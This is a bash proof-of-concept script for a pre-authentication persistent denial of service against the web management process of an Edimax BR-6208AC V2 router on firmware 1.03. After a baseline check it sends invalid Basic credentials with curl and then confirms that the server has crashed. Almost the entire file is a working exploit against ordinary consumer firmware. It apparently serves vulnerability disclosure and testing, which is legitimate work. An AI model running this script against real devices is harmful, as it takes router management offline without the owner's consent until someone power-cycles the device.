#!/bin/bash
# Edimax BR-6208AC V2 (fw 1.03) pre-auth persistent DoS — non-destructive PoC
# The PoC only crashes the web management process; no configuration is changed.
# Recovery: power-cycle the device.
TARGET="${1:-192.168.2.1}"

echo "[*] baseline: GET / (expect 302)"
curl -s -o /dev/null -w "    http=%{http_code}\n" --max-time 5 "http://$TARGET/"

echo "[*] sending invalid Basic credentials to /index.asp (expect 401)"
curl -s -o /dev/null -w "    http=%{http_code}\n" --max-time 5 \
     -u admin:wrongpass "http://$TARGET/index.asp"

sleep 2
echo "[*] post-crash: GET / (expect connection failure -> webs is dead)"
if curl -s -o /dev/null --max-time 5 "http://$TARGET/"; then
    echo "    webs is STILL ALIVE (not vulnerable / different heap state)"
else
    echo "    CONNECTION REFUSED — webs is dead. Persistent DoS confirmed."
fi
